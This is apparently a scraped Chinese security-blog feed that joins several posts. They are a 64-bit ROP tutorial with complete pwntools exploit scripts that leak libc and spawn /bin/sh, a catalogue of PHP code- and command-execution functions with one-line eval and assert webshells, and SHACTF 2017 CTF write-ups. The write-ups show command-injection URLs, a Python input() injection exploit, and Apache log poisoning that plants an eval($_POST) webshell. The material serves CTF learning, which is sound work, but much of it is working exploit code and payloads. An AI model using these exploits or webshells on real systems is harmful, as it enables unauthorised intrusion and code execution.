c3 ret 400629: 0f 1f 80 00 00 00 00 nop DWORD PTR [rax+0x0] 在《一步一步学ROP之linux_x64篇》中，利用该通用gadget的思路如下： 我们可以看到利用0x400606处的代码我们可以控制rbx,rbp,r12,r13,r14和r15的值，随后利用0x4005f0处的代码我们将r15的值赋值给rdx, r14的值赋值给rsi,r13的值赋值给edi，随后就会调用call qword ptr [r12+rbx8]。这时候我们只要再将rbx的值赋值为0，再通过精心构造栈上的数据，我们就可以控制pc去调用我们想要调用的函数了（比如说write函数）。执行完call qword ptr [r12+rbx8]之后，程序会对rbx+=1，然后对比rbp和rbx的值，如果相等就会继续向下执行并ret到我们想要继续执行的地址。所以为了让rbp和rbx的值相等，我们可以将rbp的值设置为1，因为之前已经将rbx的值设置为0了。 不过具体是怎样的一个流程，可能光看这段话不太清楚。我们根据蒸米师傅的payload1来调试一下整个ROP的过程。 ROP蒸米师傅的第一个payload，是要利用write()输出在内存中的地址，即write(1, write.got, 8)。根据64位由寄存器传参，我们要利用rop做到以下几件事： 设置rdi为1，这是第一个参数 设置rsi为 write的got地址即write.got，这是第二个参数 设置rdx为 8，这是第三个参数 成功的调用write()函数 现在利用脚本具体如下：1234567891011121314151617181920from pwn import *elf = ELF('level5')p = process('./level5')log.info(proc.pidof(p)[0])got_write = elf.got['write']print "got_write: " + hex(got_write)got_read = elf.got['read']print "got_read: " + hex(got_read)main = 0x400564payload1 = "\x00"*136payload1 += p64(0x400606) + p64(0) +p64(0) + p64(1) + p64(got_write) + p64(1) + p64(got_write) + p64(8) # pop_junk_rbx_rbp_r12_r13_r14_r15_retpayload1 += p64(0x4005F0) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]payload1 += "\x00"*56payload1 += p64(main)p.recvuntil("Hello, World\n")print "\n#############sending payload1#############\n"raw_input()p.send(payload1)raw_input() 其中log.info(proc.pidof(p)[0])用来输出process的pid，用于gdb的attach。第一个raw_input()是在发送payload之前attach上去，这样能具体的观察到发送前后内存的bain话，最后一行raw_input()是在发送payload后挂住脚本防止level5直接退出。 如图所示，进程的PID号为4597.用gdb命令gdb attach 4597后即可附加到进程上。在py脚本中按一下回车，这时会执行p.send(payload1)。接下来正式开始调试，以下命令均在gdb中进行。 第一阶段接下来我们开始正式的第一阶段的ROPpayload：123payload1 = &quot;\x00&quot;*136payload1 += p64(0x400606) + p64(0) +p64(0) + p64(1) + p64(got_write) + p64(1) + p64(got_write) + p64(8) # pop_junk_rbx_rbp_r12_r13_r14_r15_retpayload1 += p64(0x4005F0) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8] 此时程序执行到read(STDIN_FILENO, buf, 512)，我们按n后，程序执行完read，将我们的payload读到了栈上。我们输入了136个0，然后是通用gadget的起始位置0x400606。 接下去继续输入n，当程序执行将到0x400563 &lt;vulnerable_function+31&gt;: ret时，可以观察到此时栈顶为0x400606。 继续输入n，程序跳到通用gadget里，开始正式的rop。 根据我们的payload：p64(0) +p64(0) + p64(1) + p64(got_write) + p64(1) + p64(got_write) + p64(8) + p64(0x4005F0)，结合上图的stack分析，可知此时的栈中数据分布如下（小端序）： 起点 +0 +1 +2 +3 +4 +5 +6 +7 对应数据 rsp 00 00 00 00 00 00 00 00 0x0 rsp+8 00 00 00 00 00 00 00 00 0x0 rsp+16 01 00 00 00 00 00 00 00 0x1 rsp+24 00 10 60 00 00 00 00 00 0x601000 rsp+32 01 00 00 00 00 00 00 00 0x1 rsp+40 00 10 60 00 00 00 00 00 0x601000 rsp+48 08 00 00 00 00 00 00 00 0x8 rsp+56 f0 05 40 00 00 00 00 00 0x4005f0 此时各寄存器的值如下： 我们继续按n，程序执行完mov rbx,QWORD PTR [rsp+0x8]，将rsp+0x8也即rsp+8地址处的数据以QWORD形式即8字节赋值给rbx，执行完后，rbx将为0。所以这里有一点要注意的，我们的payload开头是这样的：p64(0) +p64(0) + p64(1) + ……，第一个p64(0)，是起一个padding的作用，用来填充rsp到rsp+0x7之间的数据的。（因为之前调用的read和write的第一个参数就是STDIN_FILENO，值为0，所以这里rbx原本就是0，所以可能感觉没啥变化，其实就是用0赋值给了一个原本就是0的rbx） 接下去按n，执行mov rbp,QWORD PTR [rsp+0x10]，将rsp+0x10也即rsp+16地址处的数据以QWORD形式即8字节赋值给rbp。 接下去一直按n，程序依次执行mov操作，直至add rsp,0x38，此时寄存器情况如下： 几个重要的寄存器值列举如下： RBX: 0x0 RBP: 0x1 R12: 0x601000 R13: 0x1 R14: 0x601000 R15: 0x8 此时栈中数据仍然如前： 接下去我们输入n，程序执行完add rsp,0x38，即将栈顶加上0x38，也即加上56，这相当于是降低了栈顶（栈从低地址向高地址增长）。接下去程序将会执行ret指令，而此时的栈，注意是此时的栈，其内容如下： 接下去输入n，将会执行ret指令，相当于pop rip，也就是说执行完ret，将会跳转到栈顶所指的地址0x4005f0 第二阶段接下来算是进入ROP的第二阶段。 这时的各寄存器的值如下图， 在经过三个mov操作后mov rdx,r15，mov rsi,r14，mov edi,r13d，我们成功地把进行write函数调用所需的三个参数都布置好了。 寄存器数据如下： 接下去会执行call QWORD PTR [r12+rbx*8]，而我们已经将rbx置为0，r12置为write的got地址，所以执行这句语句，其实就是在调用write()函数。用如下命令可以查看r12+rbx*8处具体的值。12gdb-peda$ x/gx $r12+$rbx*80x601000 &lt;write@got.plt&gt;: 0x00007fdb0df2c280 第三阶段在call指令执行完了后，即调用完write（）函数后，我们进入ROP的第三阶段，收尾阶段。毕竟调用完后不能让程序崩溃啊。这时候对应的payload是12payload1 += &quot;\x00&quot;*56payload1 += p64(main) 此时寄存器中： 这是之前第一阶段中，我们设置的，RBX = 0x0，RBP = 0x1。将会进行如下三条指令：1230x4005fd &lt;__libc_csu_init+93&gt;: add rbx,0x10x400601 &lt;__libc_csu_init+97&gt;: cmp rbx,rbp0x400604 &lt;__libc_csu_init+100&gt;: jne 0x4005f0 &lt;__libc_csu_init+80&gt; 将rbp加1，得到0x01，然后与值为0x01的rbp进行比较，jne指令说明如果两者比较相等则不会进行跳转，所以这里不会执行跳转，而是继续执行。 接下来“回”到了第一阶段的代码，此时的栈中的情况如下： 我们会执行六次的mov操作，但我们此时不需要再布置参数，所以可以说不用管：)。12345670x400606 &lt;__libc_csu_init+102&gt;: mov rbx,QWORD PTR [rsp+0x8]0x40060b &lt;__libc_csu_init+107&gt;: mov rbp,QWORD PTR [rsp+0x10]0x400610 &lt;__libc_csu_init+112&gt;: mov r12,QWORD PTR [rsp+0x18]0x400615 &lt;__libc_csu_init+117&gt;: mov r13,QWORD PTR [rsp+0x20]0x40061a &lt;__libc_csu_init+122&gt;: mov r14,QWORD PTR [rsp+0x28]0x40061f &lt;__libc_csu_init+127&gt;: mov r15,QWORD PTR [rsp+0x30]0x400624 &lt;__libc_csu_init+132&gt;: add rsp,0x38 接下来，会将rsp加上0x38，即加上56。结合栈的情况，这次add操作，将会将main函数的地址作为栈顶。 所以这一阶段的payload的构成是56个\x00，紧接是准备回到某个位置的内存地址。在执行完ret后，程序将回到mian函数中，以便我们进行下一次的利用。 小结综合对三个阶段的分析，在64位程序栈溢出时若用了__libc_csu_init中的gadget，其payload组成如下12345678910111213141516payload = &apos;\x00&apos; * offset # offset是溢出偏移点## 第一阶段payload += p64(mov_rbx_rsp0x8_addr)payload += p64(0) # 填充rsp到rsp+7间的数据payload += p64(0) # 为后面 rbx 置 0 做准备payload += p64(1) # 为后面 rbp 置 1 做准备paylaod += p64(call_func_got_addr) # 要调用函数的GOT地址，因为后面的调用是用QWORD PTR来进行的。payload += p64(第一个参数) # 调用函数的第一个参数payload += p64(第二个参数) # 调用函数的第二个参数payload += p64(第三个参数) # 调用函数的第三个参数payload += p64(mov_rdx_r15_addr) # 利用 ret 指令进入rop的第二阶段## 第二阶段 该阶段无需控制## 第三阶段payload += &quot;\x00&quot; * 56 # 填充 rsp 到 rsp+55间的数据payload += p64(return_addr) # 将要返回的地址， 利用现在我们利用这个通用ROP，写一个exp。大体思路是，利用DynELF借write()函数泄露出system的地址。但要注意几点，得到system的地址后，不能直接作为call_func_got_addr，而应该先写到bss段，再填入bss段的地址。所以下面的payload中，bss_addr到bss_addr+7，保存着system的地址，bss_addr+8到bss_addr+15保存着字符串“/bin/sh\x00”。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748from pwn import *elf = ELF('level5')p = process('./level5')sh = "/bin/sh\x00"bss_addr = elf.bss(0x20)got_write = elf.got['write']got_read = elf.got['read']log.success("The write got address is "+ hex(got_write))log.success("The read got address is "+ hex(got_read))main = 0x400564def leak(address): p.recv() payload = "\x00"*136 payload += p64(0x400606) + p64(0) +p64(0) + p64(1) + p64(got_write) + p64(1) + p64(address) + p64(8) payload += p64(0x4005F0) payload += "\x00"*56 payload += p64(main) p.send(payload) data = p.recv(8) return datadynelf = DynELF(leak,elf=elf)system_addr = dynelf.lookup("system","libc")log.success("The system address is " + hex(system_addr))payload2 = '\x00' * 136payload2 += p64(0x400606) + p64(0) + p64(0) + p64(1) + p64(got_read) + p64(0) + p64(bss_addr) + p64(16)payload2 += p64(0x4005F0)payload2 += "\x00" * 56payload2 += p64(main)p.send(payload2)system_sh = p64(system_addr) + shp.send(system_sh)p.recvuntil("Hello, World\n")payload3 = '\x00' * 136payload3 += p64(0x400606) + p64(0) + p64(0) + p64(1) + p64(bss_addr) + p64(bss_addr+8) + p64(0) + p64(0)payload3 += p64(0x4005F0)payload3 += "\x00"*56payload3 += p64(main)p.send(payload3)p.interactive()]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[SHACTF-2017-Secure Login-writeup]]></title>
      <url>%2F2017%2F08%2F09%2FSHACTF-2017-Secure-Login-writeup%2F</url>
      <content type="text"><![CDATA[Task12345Secure Login (200) - 67 solvesThis server uses signed tickets to allow users to login, can you find the flag?nc secure-login.stillhackinganyway.nl 12345chall.pye2050ad74ffc19ca7a95435b283b9308]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[php代码/命令执行漏洞]]></title>
      <url>%2F2017%2F08%2F08%2Fphp%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%2F</url>
      <content type="text"><![CDATA[php代码/命令执行漏洞 常见危险函数php代码执行相关eval()1mixed eval ( string $code ) 把字符串code作为php代码执行。常见的一句话木马：123&lt;?php eval($_GET['pass'])?&gt; 访问：1http://xxx/codeexec.php?pass=phpinfo(); 得到phpinfo()页面。 assert()PHP 51bool assert ( mixed $assertion [, string $description ] ) PHP 71bool assert ( mixed $assertion [, Throwable $exception ] ) assert() 会检查指定的 assertion 并在结果为 FALSE 时采取适当的响应。如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。 一句话木马：123&lt;?php assert($_GET['pass']);?&gt; 访问：1http://xxx/codeexec.php?pass=phpinfo() phpinfo()后可以不用分号。得到phpinfo()页面。 preg_replace1mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] ) 搜索subject中匹配pattern的部分， 以replacement进行替换。当使用被弃用的 e 修饰符时, 这个函数会转义一些字符，在完成替换后，引擎会将结果字符串作为php代码使用eval方式进行评估并将返回值作为最终参与替换的字符串更详细的说明见：php-preg_replace call_user_func()1mixed call_user_func ( callable $callback [, mixed $parameter [, mixed $... ]] ) 第一个参数 callback 是被调用的回调函数，其余参数是回调函数的参数。 传入call_user_func()的参数不能为引用传递。 123&lt;?php call_user_func($_GET['chybeta'],$_GET['ph0en1x']);?&gt; 访问：1http://localhost:2500/codeexec.php?chybeta=assert&amp;ph0en1x=phpinfo() call_user_func_array()1mixed call_user_func_array ( callable $callback , array $param_arr ) 把第一个参数作为回调函数（callback）调用，把参数数组作（param_arr）为回调函数的的参数传入。 123&lt;?php call_user_func_array($_GET['chybeta'],$_GET['ph0en1x']);?&gt; 访问：1http://localhost:2500/codeexec.php?chybeta=assert&amp;ph0en1x[]=phpinfo() create_function1string create_function ( string $args , string $code ) 该函数的内部实现用到了eval，所以也具有相同的安全问题。第一个参数args是后面定义函数的参数，第二个参数是函数的代码。 12345&lt;?php $a = $_GET['chybeta']; $b = create_function('$a',"echo $a"); $b('');?&gt; 访问：12http://localhost:2500/codeexec.php?chybeta=phpinfo(); array_map()1array array_map ( callable $callback , array $array1 [, array $... ] ) 作用是为数组的每个元素应用回调函数 。其返回值为数组，是为 array1 每个元素应用 callback函数之后的数组。 callback 函数形参的数量和传给 array_map() 数组数量，两者必须一样。 1234&lt;?php $array = array(0,1,2,3,4,5); array_map($_GET['chybeta'],$array);?&gt; 访问：12http://localhost:2500/codeexec.php?chybeta=phpinfo 注意没有括号()和分号;。 系统命令执行相关system()1string system ( string $command [, int &amp;$return_var ] ) command是要执行的命令。return_var，如果提供 return_var 参数， 则外部命令执行后的返回状态将会被设置到此变量中。 123&lt;?php system("whoami");?&gt; 会看到运行了shell命令，并打印回显到页面上。 passthru()1void passthru ( string $command [, int &amp;$return_var ] ) command是要执行的命令。return_var，如果提供 return_var 参数， Unix 命令的返回状态会被记录到此参数。 123&lt;?php passthru("whoami");?&gt; exec()1string exec ( string $command [, array &amp;$output [, int &amp;$return_var ]] ) exec() 执行 command 参数所指定的命令。 其余参数，见文档 123&lt;?php echo exec("whoami");?&gt; pcntl_exec()1void pcntl_exec ( string $path [, array $args [, array $envs ]] ) path是可执行二进制文件路径或一个在文件第一行指定了 一个可执行文件路径标头的脚本args是一个要传递给程序的参数的字符串数组。 123&lt;?php pcntl_exec ( "/bin/bash" , array("whoami"));?&gt; shell_exec()1string shell_exec ( string $cmd ) cmd是要执行的命令。 123&lt;?php echo shell_exec("whoami");?&gt; popen()1resource popen ( string $command , string $mode ) 打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生。 后面的mode，当为 ‘r’，返回的文件指针等于命令的 STDOUT，当为 ‘w’，返回的文件指针等于命令的 STDIN。 123&lt;?php$handle = popen("/bin/ls", "r");?&gt; proc_open()1resource proc_open ( string $cmd , array $descriptorspec , array &amp;$pipes [, string $cwd [, array $env [, array $other_options ]]] ) cmd是要执行的命令，其余见文档 `(反单引号)在php中称之为执行运算符，PHP 将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回（即，可以赋给一个变量而不是简单地丢弃到标准输出，使用反引号运算符“`”的效果与函数 shell_exec() 相同。 123&lt;?php echo `whoami`;?&gt; ob_start()1bool ob_start ([ callback $output_callback [, int $chunk_size [, bool $erase ]]] ) 此函数将打开输出缓冲。当输出缓冲激活后，脚本将不会输出内容（除http标头外），相反需要输出的内容被存储在内部缓冲区中。想要输出存储在内部缓冲区中的内容，可以使用 ob_end_flush() 函数。 可选参数 output_callback 函数可以被指定。 此函数把一个字符串当作参数并返回一个字符串。 当输出缓冲区被( ob_flush(), ob_clean() 或者相似的函数)冲刷（送出）或者被清洗的时候；或者在请求结束之际输出缓冲区内容被冲刷到浏览器的时候该函数将会被调用。 当调用 output_callback 时，它将收到输出缓冲区的内容作为参数 并预期返回一个新的输出缓冲区作为结果，这个新返回的输出缓冲区内容将被送到浏览器。 下面的代码，由于调用了ob_end_flush()，所以会调用ob_start($cmd)中的cmd，把我们输入的$_GET[a]作为cmd的参数。123456&lt;?php $cmd = 'system'; ob_start($cmd); echo "$_GET[a]"; ob_end_flush();?&gt; 访问：1http://localhost:2500/codeexec.php?a=whoami php mail()mail 文档1234567bool mail ( string $to , string $subject , string $message [, string $additional_headers [, string $additional_parameters ]]) 要使用mail()函数，需要配置对应的服务器等，在php.ini中有两个选项： 配置SMTP服务器的主机名和端口 配置PHP用作邮件传输代理（MTA）的文件路径 当PHP配置了第二个选项时，对该mail()函数的调用将导致执行配置对MTA程序。虽然PHP内部使用escapeshellcmd()用于程序调用，防止新的shell命令注入，但第5个参数$additional_parameters中mail()允许添加的新程序。因此，攻击者可以附加程序标志，在某些MTA中可以创建具有用户控制内容的文件。 实例：多个PHP mail函数引发的命令执行漏洞分析 参考：为什么mail()函数在PHP中是危险的 反序列化问题见：浅谈php反序列化漏洞 LD_PRELOAD绕过实例：第十届全国大学生信息安全技能赛PHP execise参考: 利用环境变量LD_PRELOAD来绕过php disable_function执行系统命令 Refference Obvious and not so obvious PHP code injection and evaluation]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[SHACTF-2017-Growing Up-writeup]]></title>
      <url>%2F2017%2F08%2F06%2FSHACTF-2017-Growing-Up-writeup%2F</url>
      <content type="text"><![CDATA[SHACTF-2017-Growing Up-writeup 单刷。 前言Growing Up这题题目如下1You remember the day you started hacking or playing CTF&apos;s? You can relive these days by playing our junior version. Just solve all challenges to get the flag ;-) 所以只有当把 Junior上的题全做完后才能拿到flag。自己一个人单刷了四五个小时，最后于凌晨2：25分拿到了这题的flag。 CryptoAll about the Base (1)12345We found this encoded message. Can you decode it?V2VsbCBkb25lLAoKdGhpcyBmaWxlIGlzIGVuY3J5cHRlZCB3aXRoIEJhc2U2NC4gT2Z0ZW4gdXNlZCBpbiBDVEYncyB0byBkaXNwbGF5IGJpbmFyeSBkYXRhIGluIGEgbW9yZSBmcmllbmRseSB3YXkuIAoKVGhlIGZsYWcgZm9yIHRoaXMgY2hhbGxlbmdlIGlzIGZsYWd7YjNlOWMzZWVlNjA5YmFjNDZmYWQ0NDM5Y2YzMjFmZTV9Cg== flag:123&gt;&gt;&gt; import base64&gt;&gt;&gt; base64.b64decode(&quot;V2VsbCBkb25lLAoKdGhpcyBmaWxlIGlzIGVuY3J5cHRlZCB3aXRoIEJhc2U2NC4gT2Z0ZW4gdXNl ZCBpbiBDVEYncyB0byBkaXNwbGF5IGJpbmFyeSBkYXRhIGluIGEgbW9yZSBmcmllbmRseSB3YXku IAoKVGhlIGZsYWcgZm9yIHRoaXMgY2hhbGxlbmdlIGlzIGZsYWd7YjNlOWMzZWVlNjA5YmFjNDZm YWQ0NDM5Y2YzMjFmZTV9Cg==&quot;)&quot;Well done,\n\nthis file is encrypted with Base64. Often used in CTF&apos;s to display binary data in a more friendly way. \n\nThe flag for this challenge is flag&#123;b3e9c3eee609bac46fad4439cf321fe5&#125;\n&quot; Rotation (1)12Seems someone rotated the alphabet, can you get the original message back?Ykksy eua ckxk ghrk zu mkz znk zkdz hgiq. Znk lrgm oy lrgm&#123;30j3g1gg0ijg9l08ijlg52668hi6854g&#125; 凯撒1Seems you were able to get the text back. The flag is flag&#123;30d3a1aa0cda9f08cdfa52668bc6854a&#125; Substitute Teacher (2)1234Hello, my name is Mr. Smith, I will be your substitute teacher for today. I only have one assignment for you today, if you solve it you may go home. Now be silence and solve it, so I can Netflix and chill!osvi cpm dprzsob ulsd hddsboeiou. iocpg gpaj njii usei. rihzi uli vrhdd tsulpau ehfsob h dpaow,s&apos;e so uli eswwri pn h oit iqsdpwi pn pjhobi sd uli oit mrhvf po oiunrsy. npj gpaj innpjud s lhzih nrhb npj gpa: nrhb&#123;h230h7i624hnhv36291v5n31nh818w6n&#125; 词频分析一下，丢到这个网站 http://quipqiup.com/ ：1flag&#123;a230a7e624afac36291c5f31fa818d6f&#125; Exclusive or … (2)1We found this strange text, can you get the original from it? 题目说得很明显啦，异或加密。我们可以用工具xortool。 得到明文：1Well done. This text is encrypted with XOR with the single character &apos;\x03&apos;. XOR is often used in CTF challenges. We did use it in our teaser challenges &apos;Crypto Engine&apos; and &apos;Website Attack&apos;. The flag of this challenge is: flag&#123;a157d2b4eb73c60ff0cdbe2a2dea06c3&#125; flag为：1flag&#123;a157d2b4eb73c60ff0cdbe2a2dea06c3&#125; Transposition (3)123We intercepted this secret message. We believe it is using a transposition cipher. Can you decipher it?Citgoe6b0 oohern636 nni.tg1e2 gssThe58e rschii366aohess3ae tlafcf3dc uvllhl24f lilaaa730 aneglg506 tgnfl&#123;33&#125; 竖下来读。得到明文1Congratulationssolvingthischallenge.Theflagforthischalengeisflag&#123;66153332753b3e86ad4303062e6ecf06&#125; flag：1flag&#123;66153332753b3e86ad4303062e6ecf06&#125; ForensicsDeleted File (3) 1FLAG&#123;129F0A52F0F41E077E0FD03063FF4FAD&#125; MiscZipfile One (1)1We received this zip file, but is asking for a password. All we know is that the password exists of 5 numbers, can you crack this password to get the hidden information? 给了压缩包，又说了是五个数字。爆破得密码为42831。flag：1flag&#123;d6f56ae046bb241cc61f9d26f8e525d9&#125; Zipfile Two (2)1We received another zip file, which also requires a password. All we know is that the password is an existing English word with a length of 6 and all lowercase. Can you crack this password? 继续爆破，得密码为：future。得到flag：1flag&#123;7128d78caf1e3297386a09afae0f8ea4&#125; Reverse (3)1We found this file on a server on the other side of the world, it looks weird, can you &quot;reverse&quot; it? 一开始做的时候，从后读取放到新文件里，比如\x74 \xe4 \x05 \x98对应成\x98 \x05 \xe4 \x7，结果输出后发现没用。后面突然想到，74e40598，直接尼过来是 89504e47，这个正是png的文件头。 所以我先把原文件的十六进制拿了出来，把里面的空格，换行符去掉，放到reverse_fix中。用下面的脚本得到“逆向”后的十六进制。1234567891011reverse = open("reverse_fix","r")flag_reverse = open("flag_reverse.txt","wb")data = reverse.read()datalen = len(data)data = data[::-1]flag_reverse.write()reverse.close()flag_reverse.close() 之后再把flag_reverse.txt中的内容复制到十六进制编辑器中，保存为一张图片。 flag：1flag&#123;758d7fa2762ab838c4835f1995e151d2&#125; NetworkDownload (1) 1FLAG&#123;259F1B841EAAA4FCB843D77DCDADE55A&#125; Wanna Buy A Flag? (2)打开后追踪TCP流，得到flag：1flag&#123;f08574923ec9c9ffb47188e6edc1a20f&#125; Weird Website (3) 导出页面后查看。1flag&#123;8233daf526dcee25fd9ffda3bb99d677&#125; Captured Mail (4) 12345678import base64capturedmail = open("capturedmail.zip","wb")data = "UEsDBBQAAAAIAIy53UoyFb1+UwAAAFgAAAAIABwAZmxhZy50eHRVVAkAAzhtVVk4bVVZdXgLAAEE6AMAAAToAwAAFclLCoAgEADQfaeYA0QQMaOz7iSjjB8QBbVVdPdq+Xhnq7HLvIrM3OpYYSaFUCRCaP1DHuCTlKI1Knz4694dsrHGGELrxAuzV8JDAgVBJn225QVQSwECHgMUAAAACACMud1KMhW9flMAAABYAAAACAAYAAAAAAABAAAApIEAAAAAZmxhZy50eHRVVAUAAzhtVVl1eAsAAQToAwAABOgDAABQSwUGAAAAAAEAAQBOAAAAlQAAAAAA"capturedmail.write(base64.b64decode(data))capturedmail.close() 得到一个压缩包，解压后得到flag： 1flag&#123;1b5978777658baca99ce653af6fa596e&#125; WebIn Your Head (1)地址：http://inyourhead.stillhackinganyway.nl/ 抓包看头部，得到flag：1flag&#123;a1a4d64086f713e92a809859d930d120&#125; Old School (2)地址：http://oldschool.stillhackinganyway.nl/抓包修改User-Agent头：Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)1flag&#123;f374df6554c7c6a6fced10396c84baf6&#125; Broken Image (2)查看源代码，把base64串进行解密。得到flag：1flag&#123;c0711614358a27110ca159302b106759&#125; Location (3)点进去后，每次访问一个新的页面，就记下页面的三个字母。等跳转完把字母拼接起来就行了。1flag&#123;f51cf5e7e1d003986acd2864139553a1&#125; Ping (4)1http://ping.stillhackinganyway.nl/?ip=127.0.0.1|ls 知道有 s3cr3tfl4g.txt 1http://ping.stillhackinganyway.nl/?ip=127.0.0.1|cat s3cr3tfl4g.txt 得到flag：1flag&#123;a8bb1ea55704762941ef519f98fff075&#125; Pwnablesmall (4)服务器端是python服务。12#!/usr/bin/env pythonprint "HACK "*input("Number: ") 以下是exp： 1234567from pwn import *r = remote("small.stillhackinganyway.nl",1337)paylaod = "__import__('os').system('cat /home/small/flag')"r.sendline(paylaod)# print(r.recv())r.interactive() 得到flag：1flag&#123;69b5a247b9cd52ac97de7cc94994083e&#125; ReFind The Flag (1)用IDA打开看一下就得到了flag：1flag&#123;b760866fa6f035548be127b7525dbb66&#125; Hidden Message (3)JEB打开，查看strings.xml。 1flag&#123;d3314ac1a08d65ea32ffd30907de2409&#125; Flip A Coin (4)用IDA打开后，通过查看strings可以找到关键处。可以看到当v3==100，时会输出flag。 而v3是在每次赢了之后会加一，其地址为0x00401668 接下来用olldbg来动态调试。 给0x00401668处下个断点。 第一次输1，如果赢了的话，会看到对应的位置由0变成了1 利用olldbg的修改数据功能，我们把1修改为100，这里是十六进制，所以填入64 之后点击运行。程序判断v3==100后进行输出flag操作。 flag:1flag&#123;d754c599d47d9b3e4a376e1d770ca8c1&#125; Jump Around (4) 写个程序跑一下。12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#include &lt;iostream&gt;#include &lt;cstdio&gt;#include &lt;windows.h&gt;using namespace std;int main()&#123; int v1[48]; __int64 v8 = 7523094288207667809LL; __int64 v9 = 8101815670912281193LL; __int64 v10 = 8680537053616894577LL; __int64 v11 = 3833745473465776761LL; __int64 v12 = 959985462; __int64 v13 = 24929; __int64 v2 = 6508264540403273223LL; __int64 v3 = 5213490578399759196LL; __int64 v4 = 5409190721146722066LL; __int64 v5 = 73472674227045146LL; __int64 v6 = 202114575; __int64 v7 = 7173; int i; for ( i = 0; i &lt;= 7; ++i )&#123; v1[i] = *((char *)&amp;v2 + i) ^ *((char *)&amp;v8 + i); printf("%c",v1[i]); &#125; for ( i = 0; i &lt;= 7; ++i )&#123; v1[i] = *((char *)&amp;v3 + i) ^ *((char *)&amp;v9 + i); printf("%c",v1[i]); &#125; for ( i = 0; i &lt;= 7; ++i )&#123; v1[i] = *((char *)&amp;v4 + i) ^ *((char *)&amp;v10 + i); printf("%c",v1[i]); &#125; for ( i = 0; i &lt;= 7; ++i )&#123; v1[i] = *((char *)&amp;v5 + i) ^ *((char *)&amp;v11 + i); printf("%c",v1[i]); &#125; for ( i = 0; i &lt;= 3; ++i )&#123; v1[i] = *((char *)&amp;v6 + i) ^ *((char *)&amp;v12 + i); printf("%c",v1[i]); &#125; for ( i = 0; i &lt;= 1; ++i )&#123; v1[i] = *((char *)&amp;v7 + i) ^ *((char *)&amp;v13 + i); printf("%c",v1[i]); &#125; return 0;&#125; 得到flag：1flag&#123;f525a6abd58ce9488f3c90904149145d&#125;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[SHACTF-2017-Web-writeup]]></title>
      <url>%2F2017%2F08%2F06%2FSHACTF-2017-Web-writeup%2F</url>
      <content type="text"><![CDATA[SHACTF-2017-Web-writeup Bon Appétit (100)Methon One1bonappetit.stillhackinganyway.nl 有个page参数。访问:1view-source:http://bonappetit.stillhackinganyway.nl/?page=.htaccess 得到有个 suP3r_S3kr1t_Fl4G 。访问：12http://bonappetit.stillhackinganyway.nl/?page=suP3r_S3kr1t_Fl4G 得到flag：1flag&#123;82d8173445ea865974fc0569c5c7cf7f&#125; 感谢lzhtony和各位大佬的帮忙，不然我还一直沉浸在log的世界里不能自拔。。 Methon Two有包含，那就可以包含日志。由于题目有提到apache的log。所以有必要去看看log保存在什么地方。访问：12http://bonappetit.stillhackinganyway.nl/?page=//etc/apache2/sites-enabled/000-default.conf error.log在默认位置，而CustomLog在由var/www/html/log.sh决定。接下来我们访问：12http://bonappetit.stillhackinganyway.nl/?page=//var/www/html/log.sh 可以知道，我们访问这个页面的log，会被保存到/var/www/html/logs/${HOST}.log中，而${HOST}即为你的ip地址。 接下来我们正式利用log来getshell。 在自己的vps（具有公网ip）上，访问1http://bonappetit.stillhackinganyway.nl/&lt;?php @eval($_POST[&apos;test&apos;]);?&gt; 并用burp截包修改被转义的字符。如下，之后将其转发出去。 接下来包含自己对应主机的log文件。1http://bonappetit.stillhackinganyway.nl/?page=//var/www/html/logs/yourvpsip.log 用菜刀连上，密码为test。 最终得到flag：]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[SHACTF-2017-WannaFly-writeup]]></title>
      <url>%2F2017%2F08%2F06%2FSHACTF-2017-WannaFly-writeup%2F</url>
      <content type="text"><![CDATA[SHACTF-2017-WannaFly-writeup。虽然只有100分，不过比国内一些比赛的题目质量好多了。 题目1234WannaFly (100)My daughter Kimberly her computer got hacked. Now she lost all her favorite images. Can you please help me recover those images?wannafly.tgz7509faed92d67a242068de6605659ca1 分析镜像题目压缩包下载下来后解压有一个img镜像文件。用DiskGenius载入后浏览文件。 文件.bash_history内容如下：123456unset HISTFILls -lapwdchmod +x ..../... Hb8jnSKzaNQr5f7pls -Rla 文件...内容是一个python脚本，这边先不放出来，放在后面分析用。这里有个坑，DiskGenius是在win平台下的，直接把这个文件导出来后，win系统无法识别点开头的文件根本无法打开，也不能删除。我的方法是把这个导出来的文件先用压缩包压缩后，在压缩包中进行一下重命名，之后再解压缩出来。 在Picture文件夹里有一些被加密后的图片。如下： 深入分析前面我们得到了...文件，其内容如下：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576#!/usr/bin/env pythonimport random, string, sys, osfrom time import timefrom Crypto.Cipher import AESimport base64from PIL import Imagefrom PIL import ImageFontfrom PIL import ImageDrawfrom PIL import ImageFilterimport textwrapfrom io import 